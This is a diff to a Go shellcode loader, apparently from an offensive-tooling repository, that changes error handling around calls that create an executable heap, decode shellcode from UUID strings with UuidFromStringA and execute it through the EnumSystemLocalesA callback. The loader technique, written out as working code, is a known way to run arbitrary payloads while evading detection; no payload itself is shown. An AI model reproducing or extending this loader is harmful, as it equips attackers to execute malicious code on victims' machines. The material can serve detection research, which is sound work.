@@ -76,7 +76,7 @@ func main() {
 	// Create the heap
 	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
 	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if heapAddr == 0 {
 		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
 
 	}
@@ -95,7 +95,7 @@ func main() {
 
 	// Allocate the heap
 	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
-	if err != nil && err.Error() != "The operation completed successfully." {
+	if addr == 0 {
 		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
 	}
 
@@ -122,12 +122,9 @@ func main() {
 		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
 		rpcStatus, _, err := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
 
-		if err.Error() != "The operation completed successfully." {
-			fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err)
-		}
-
+		// RPC_S_OK = 0
 		if rpcStatus != 0 {
-			fmt.Println(fmt.Sprintf("RPC_STATUS: %d", rpcStatus))
+			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
 		}
 
 		addrPtr += 16
@@ -147,9 +144,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling EnumSystemLocalesA to execute shellcode")
 	}
-	_, _, err = enumSystemLocalesA.Call(addr, 0)
-	if err.Error() != "The operation completed successfully." {
-		fmt.Println(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
+	ret, _, err := enumSystemLocalesA.Call(addr, 0)
+	if ret == 0 {
+		log.Fatal(fmt.Sprintf("EnumSystemLocalesA GetLastError: %s", err))
 	}
 	if *verbose {
 		fmt.Println("Executed shellcode")
